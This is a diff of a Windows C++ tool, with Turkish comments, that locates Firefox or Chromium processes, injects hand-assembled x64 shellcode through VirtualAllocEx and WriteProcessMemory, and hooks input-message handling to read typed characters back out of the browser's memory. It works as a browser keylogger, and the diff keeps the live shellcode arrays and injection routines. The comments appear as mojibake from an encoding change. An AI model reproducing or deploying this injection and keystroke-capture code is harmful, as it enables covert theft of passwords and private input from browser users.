@@ -5,45 +5,6 @@
 #include "PatternSearch.h"
 
 
-typedef struct shellcodeStack {
-    DWORD64 DosHeader;                  // 0x00
-    DWORD64 ImportDescriptor;           // 0x08
-    DWORD64 OriginalFuncAddr;           // 0x10
-    DWORD64 FirstThunk;                 // 0x18
-    DWORD64 OriginalFirstThunk;         // 0x20
-    DWORD64 oldProtect;                 // 0x28
-    DWORD64 VirtualProtectAddr;         // 0x30
-    DWORD64 OGreturnAddr;               // 0x38
-    DWORD64 hCreateFileW;               // 0x40
-    DWORD64 hWriteFile;                 // 0x48
-    DWORD64 pMSG;                       // 0x50
-    DWORD64 hKernel32;                  // 0x58
-    DWORD64 ExportedFuncNum;            // 0x60
-    DWORD64 ExportedFunctionsTable;     // 0x68
-    DWORD64 addressOfNamePointer;       // 0x70
-    DWORD64 addressOfOrdinalTable;      // 0x78
-    DWORD64 hGetProcAddress;            // 0x80
-    DWORD64 firstReturnAddr;            // 0x88
-    DWORD64 bytesWritten;               // 0x90
-    DWORD64 AsciiValue;                 // 0x98
-    //burdan sonras˝ deneysel alan
-    DWORD64 hLoadLibraryA;//0xA0
-    //deneysel alan biti˛i string sahas˝
-    char USER32String[11];              // 0x100
-    char GetMessageWString[12];         // 0x110 buraya fakl˝ bi˛ey gelebilir hooklanacak fonk bu ondan 0x20(32) bayt fazlas˝ var
-    char VirtualProtectString[15];      // 0x130
-    char KERNEL32String[13];            // 0x140
-    char CreateFileWString[13];         // 0x150
-    char WriteFileString[10];           // 0x160
-    char LoadLibraryAString[12];        // 0x170
-    char GetProcAddressString[15];      // 0x180
-    char PipeNameString[1];             // 0x190
-
-    long stack;                         // 0x1B0
-
-};
-
-
 
 bool SearchFile(const wchar_t* directory, const wchar_t* targetFileName, wchar_t* foundPath, size_t foundPathSize) {
     wchar_t searchPath[MAX_PATH];
@@ -97,22 +58,22 @@ unsigned long getPID(wchar_t* ProcessName) {
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    // ›lk i˛lemi al
+    // √ùlk i√ælemi al
     if (Process32First(hSnapshot, &pe32)) {
         do {
-            // ›˛lem ad˝n˝ ve PID'yi yazd˝r
+            // √ù√ælem ad√Ωn√Ω ve PID'yi yazd√Ωr
             std::wcout << L"Process: " << pe32.szExeFile << L" | PID: " << pe32.th32ProcessID << std::endl;
             if (wcscmp(ProcessName, pe32.szExeFile) == 0) {
                 return pe32.th32ProcessID;
             }
-        } while (Process32Next(hSnapshot, &pe32)); // Sonraki i˛lemi al
+        } while (Process32Next(hSnapshot, &pe32)); // Sonraki i√ælemi al
     }
 
     else {
-        std::cerr << "Process32First ba˛ar˝s˝z oldu!" << std::endl;
+        std::cerr << "Process32First ba√æar√Ωs√Ωz oldu!" << std::endl;
     }
 
-    // Anl˝k gˆr¸nt¸y¸ serbest b˝rak
+    // Anl√Ωk g√∂r√ºnt√ºy√º serbest b√Ωrak
     CloseHandle(hSnapshot);
 
     return 0;
@@ -143,18 +104,18 @@ PIDS getMultiplePIDS(wchar_t* ProcessName) {
 
     size_t processCounter = 0;
 
-    // ›lk i˛lemi al
+    // √ùlk i√ælemi al
     if (Process32First(hSnapshot, &pe32)) {
         do {
-            // ›˛lem ad˝n˝ ve PID'yi yazd˝r
+            // √ù√ælem ad√Ωn√Ω ve PID'yi yazd√Ωr
             std::wcout << L"Process: " << pe32.szExeFile << L" | PID: " << pe32.th32ProcessID << std::endl;
             if (wcscmp(ProcessName, pe32.szExeFile) == 0) {
                 ++processCounter;
             }
-        } while (Process32Next(hSnapshot, &pe32)); // Sonraki i˛lemi al
+        } while (Process32Next(hSnapshot, &pe32)); // Sonraki i√ælemi al
     }
     else {
-        std::cerr << "Process32First ba˛ar˝s˝z oldu!" << std::endl;
+        std::cerr << "Process32First ba√æar√Ωs√Ωz oldu!" << std::endl;
     }
 
     if (processCounter == 0) {
@@ -172,17 +133,17 @@ PIDS getMultiplePIDS(wchar_t* ProcessName) {
                 pPids[counter] = pe32.th32ProcessID;
                 ++counter;
             }
-        } while (Process32Next(hSnapshot, &pe32)); // Sonraki i˛lemi al
+        } while (Process32Next(hSnapshot, &pe32)); // Sonraki i√ælemi al
     }
 
     else {
-        std::cerr << "Process32First ba˛ar˝s˝z oldu!" << std::endl;
+        std::cerr << "Process32First ba√æar√Ωs√Ωz oldu!" << std::endl;
         pids.size = 0;
         return pids;
     }
 
     pids.pids = pPids;
-    // Anl˝k gˆr¸nt¸y¸ serbest b˝rak
+    // Anl√Ωk g√∂r√ºnt√ºy√º serbest b√Ωrak
     CloseHandle(hSnapshot);
 
     return pids;
@@ -221,7 +182,7 @@ void memReadLoopTemp(PMEMREADPARAMS params, size_t procSize, size_t readOffset) 
     //LPVOID pReadAddress = (LPVOID)readAddress;
 
     unsigned long* keepCounter = (unsigned long*)malloc(procSize * sizeof(unsigned long));
-    unsigned long* TimerAmnesia = (unsigned long*)malloc(procSize * sizeof(unsigned long));    //arada okunmam˝˛ bas˝mlar var m˝ onun kontrol¸ 0 harici kaÁ adet olduudur
+    unsigned long* TimerAmnesia = (unsigned long*)malloc(procSize * sizeof(unsigned long));    //arada okunmam√Ω√æ bas√Ωmlar var m√Ω onun kontrol√º 0 harici ka√ß adet oldu√∞udur
     memset(keepCounter, 0x00, procSize * sizeof(unsigned long));
     memset(TimerAmnesia, 0xFF, procSize * sizeof(unsigned long));
 
@@ -299,7 +260,7 @@ void memReadLoop(PMEMREADPARAMS params, size_t procSize, size_t readOffset) {
     //LPVOID pReadAddress = (LPVOID)readAddress;
 
     unsigned long* keepCounter = (unsigned long*)malloc(procSize * sizeof(unsigned long));
-    unsigned long* TimerAmnesia = (unsigned long*)malloc(procSize*sizeof(unsigned long));    //arada okunmam˝˛ bas˝mlar var m˝ onun kontrol¸ 0 harici kaÁ adet olduudur
+    unsigned long* TimerAmnesia = (unsigned long*)malloc(procSize*sizeof(unsigned long));    //arada okunmam√Ω√æ bas√Ωmlar var m√Ω onun kontrol√º 0 harici ka√ß adet oldu√∞udur
     memset(keepCounter, 0x00, procSize * sizeof(unsigned long));
     memset(TimerAmnesia, 0xFF, procSize * sizeof(unsigned long));
 
@@ -311,7 +272,7 @@ void memReadLoop(PMEMREADPARAMS params, size_t procSize, size_t readOffset) {
         ReadProcessMemory(param.hProcessMem, LPVOID(param.pMemAllocatedSpace + readOffset), &value, sizeof(value), &byteRead);
         //std::cout << value[0] << value[1] << "\n";
         if (value[1] != (keepCounter[procNum])) {
-            TimerAmnesia[procNum] = value[1] - keepCounter[procNum] - 0x01;   //0x02 deeri GetMessageW olaca˝ zaman 0x01 olmal˝
+            TimerAmnesia[procNum] = value[1] - keepCounter[procNum] - 0x01;   //0x02 de√∞eri GetMessageW olaca√∞√Ω zaman 0x01 olmal√Ω
             if (TimerAmnesia[procNum] != 0x00000000) {
                 value[0] = '?';
             }
@@ -351,7 +312,7 @@ void memReadLoop(PMEMREADPARAMS params, size_t procSize, size_t readOffset) {
 unsigned char* GetWin32uAddr(DWORD pid) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
     if (snapshot == INVALID_HANDLE_VALUE) {
-        //std::cerr << "Snapshot al˝namad˝: " << GetLastError() << "\n";
+        //std::cerr << "Snapshot al√Ωnamad√Ω: " << GetLastError() << "\n";
         return 0x0000000000000000;
     }
 
@@ -367,7 +328,7 @@ unsigned char* GetWin32uAddr(DWORD pid) {
         } while (Module32Next(snapshot, &me32));
     }
     else {
-        //std::cerr << "Module32First ba˛ar˝s˝z: " << GetLastError() << "\n";
+        //std::cerr << "Module32First ba√æar√Ωs√Ωz: " << GetLastError() << "\n";
     }
 
     CloseHandle(snapshot);
@@ -383,12 +344,12 @@ MEMREADPARAMS patchFunc(unsigned long offset, unsigned long pid) {
     memreadparams.pMemAllocatedSpace = NULL;
 
     unsigned char shellcode[] = { 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xC3, 0x48, 0x83, 0xC3, 0x05, 0x48, 0x81, 0xC3, 0x8A, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x08, 0x48, 0x3D, 0x00, 0x01, 0x00, 0x00, 0x74, 0x38, 0x48, 0x83, 0xF8, 0x65, 0x74, 0x32, 0x48, 0x3D, 0x02, 0x01, 0x00, 0x00, 0x74, 0x2A, 0x48, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x74, 0x22, 0x48, 0x3D, 0x04, 0x01, 0x00, 0x00, 0x74, 0x1A, 0x48, 0x3D, 0x05, 0x01, 0x00, 0x00, 0x74, 0x12, 0x48, 0x3D, 0x06, 0x01, 0x00, 0x00, 0x74, 0x0A, 0x48, 0x3D, 0x07, 0x01, 0x00, 0x00, 0x74, 0x02, 0xEB, 0x0C, 0x48, 0x8B, 0x49, 0x10, 0x48, 0x89, 0x4B, 0x20, 0x48, 0xFF, 0x43, 0x28, 0x59, 0x5B, 0x48, 0xB8, 0x21, 0x43, 0x65, 0x87, 0x78, 0x56, 0x34, 0x12, 0x48, 0xB8, 0x65, 0x87, 0x78, 0x56, 0x34, 0x12, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90,
-        //buradan sonras˝na OG instruction gelecek
+        //buradan sonras√Ωna OG instruction gelecek
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         //0x17(23) bayt 
-        //sonras˝ pHeap
+        //sonras√Ω pHeap
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 
@@ -427,7 +388,7 @@ MEMREADPARAMS patchFunc(unsigned long offset, unsigned long pid) {
 
     std::cout << "pid: " << pid << "address: " << std::hex << pAllocatedSpace << "\n";
 
-    LPVOID targetAddress = (LPVOID)patchAddr; // ˆrnek adres
+    LPVOID targetAddress = (LPVOID)patchAddr; // √∂rnek adres
     //std::cout << "target address: " << targetAddress << "\n";
 
     DWORD oldProtect;
@@ -436,13 +397,13 @@ MEMREADPARAMS patchFunc(unsigned long offset, unsigned long pid) {
         return memreadparams;
     }
 
-    // Bellee yaz
+    // Belle√∞e yaz
     if (!WriteProcessMemory(hProcess, targetAddress, patch, patchBufferSize, nullptr)) {
         //std::cerr << "WriteProcessMemory failed: " << GetLastError() << "\n";
         return memreadparams;
     }
 
-    // Koruma geri al˝n˝r
+    // Koruma geri al√Ωn√Ωr
     VirtualProtectEx(hProcess, targetAddress, patchBufferSize, oldProtect, &oldProtect);
 
     memreadparams.pMemAllocatedSpace = (unsigned long long)pAllocatedSpace;
@@ -481,7 +442,7 @@ MEMREADPARAMS patchFuncChromium(unsigned long pid, unsigned long long* patchAddr
 
     std::cout << "pid: " << pid << "address: " << std::hex << pAllocatedSpace << "\n";
 
-    LPVOID targetAddress = (LPVOID)patchAddr; // ˆrnek adres
+    LPVOID targetAddress = (LPVOID)patchAddr; // √∂rnek adres
     //std::cout << "target address: " << targetAddress << "\n";
 
     DWORD oldProtect;
@@ -490,13 +451,13 @@ MEMREADPARAMS patchFuncChromium(unsigned long pid, unsigned long long* patchAddr
         return memreadparams;
     }
 
-    // Bellee yaz
+    // Belle√∞e yaz
     if (!WriteProcessMemory(hProcess, targetAddress, patch, patchBufferSize, nullptr)) {
         //std::cerr << "WriteProcessMemory failed: " << GetLastError() << "\n";
         return memreadparams;
     }
 
-    // Koruma geri al˝n˝r
+    // Koruma geri al√Ωn√Ωr
     VirtualProtectEx(hProcess, targetAddress, patchBufferSize, oldProtect, &oldProtect);
 
     memreadparams.pMemAllocatedSpace = (unsigned long long)pAllocatedSpace;
@@ -513,11 +474,11 @@ unsigned long long getFuncOffset() {
     HMODULE hModule = LoadLibraryA("win32u.dll");
 
     if (!hModule) {
-        //std::cerr << "Mod¸l bulunamad˝: " << shell32path << "\n";
+        //std::cerr << "Mod√ºl bulunamad√Ω: " << shell32path << "\n";
         return -1;
     }
 
-    // PE header ¸zerinden boyutu ˆreniyoruz
+    // PE header √ºzerinden boyutu √∂√∞reniyoruz
     auto base = reinterpret_cast<BYTE*>(hModule);
     auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
     auto ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dosHeader->e_lfanew);
@@ -625,7 +586,7 @@ int wmain(int argc, wchar_t* argv[]) {
     }
     else if (wcscmp(argv[1], L"-i") == 0) {
         inputName = argv[2];
-        std::wcout << L"›sim alindi: " << inputName << L"\n";
+        std::wcout << L"√ùsim alindi: " << inputName << L"\n";
         
         if (argc >= 4 && wcscmp(argv[3], L"-m") == 0) {
             pid = getMultiplePIDS(inputName);
@@ -650,7 +611,7 @@ int wmain(int argc, wchar_t* argv[]) {
     }
 
     else {
-        std::wcout << L"GeÁersiz parametre.\n";
+        std::wcout << L"Ge√ßersiz parametre.\n";
         return 1;
     }
 
@@ -676,10 +637,10 @@ int wmain(int argc, wchar_t* argv[]) {
         //CloseHandle(hProcessMem);
     }
    
-    //firefox deilse chromium tabanl˝ kabul ediliyor
+    //firefox de√∞ilse chromium tabanl√Ω kabul ediliyor
     
     else {
-        //buray˝ pid girilirse otomatik als˝n yoksa problem oluyor
+        //buray√Ω pid girilirse otomatik als√Ωn yoksa problem oluyor
         wchar_t* inputDll = (wchar_t*)malloc((wcslen(inputName) * 2) + 2);
 
         //chrome.exe yi chrome.dll yapma
@@ -699,12 +660,12 @@ int wmain(int argc, wchar_t* argv[]) {
         //unsigned long pid = 26968;
         /*
         unsigned char shellcode[] = { 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x7E, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0xD8, 0x48, 0x2D, 0x7E, 0x00, 0x00, 0x00, 0x48, 0x05, 0x4C, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x03, 0x59, 0x5B, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x4C, 0x89, 0xC6, 0xFF, 0xE0, 0x50, 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x7E, 0x00, 0x00, 0x00, 0x8A, 0x08, 0x88, 0x4B, 0x20, 0x48, 0xFF, 0x43, 0x28, 0x48, 0x8B, 0x4B, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x10, 0x59, 0x5B, 0xC3,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // dˆn¸˛ adresi yaz˝lacak
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // d√∂n√º√æ adresi yaz√Ωlacak
                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         };*/
         unsigned char shellcode[] = { 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x94, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0xD8, 0x48, 0x2D, 0x94, 0x00, 0x00, 0x00, 0x48, 0x05, 0x4C, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x03, 0x59, 0x5B, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x4C, 0x89, 0xC6, 0xFF, 0xE0, 0x50, 0x50, 0x53, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0xB9, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x29, 0xCB, 0x48, 0x81, 0xC3, 0x94, 0x00, 0x00, 0x00, 0x8A, 0x00, 0x88, 0x43, 0x20, 0x48, 0xFF, 0x43, 0x28, 0x48, 0x8B, 0x4B, 0x28, 0x48, 0xF7, 0xC1, 0x01, 0x00, 0x00, 0x00, 0x75, 0x07, 0x48, 0xD1, 0xE9, 0x88, 0x44, 0x0B, 0x30, 0x48, 0x8B, 0x4B, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x18, 0x59, 0x5B, 0x58, 0xC3,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // dˆn¸˛ adresi yaz˝lacak
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // d√∂n√º√æ adresi yaz√Ωlacak
                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 
